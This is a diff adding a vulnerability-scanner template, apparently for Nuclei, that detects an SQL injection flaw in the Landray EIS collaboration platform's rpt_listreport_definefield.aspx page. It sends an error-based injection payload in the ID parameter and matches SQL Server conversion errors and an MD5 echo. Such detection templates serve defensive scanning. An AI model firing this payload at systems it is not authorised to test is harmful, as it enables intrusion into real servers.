@@ -1,0 +1,28 @@
+id: landray-eis-rpt-listreport-sqli
+info:
+  name: 蓝凌EIS 智慧协同平台 rpt_listreport_definefield.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    蓝凌EIS 智慧协同平台 rpt_listreport_definefield.aspx SQL注入漏洞, allows SQL injection due to improper sanitization.
+variables:
+  t1: '{{rand_int(100, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - raw:
+      - |
+        GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "{{t2}}"
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
+        part: body
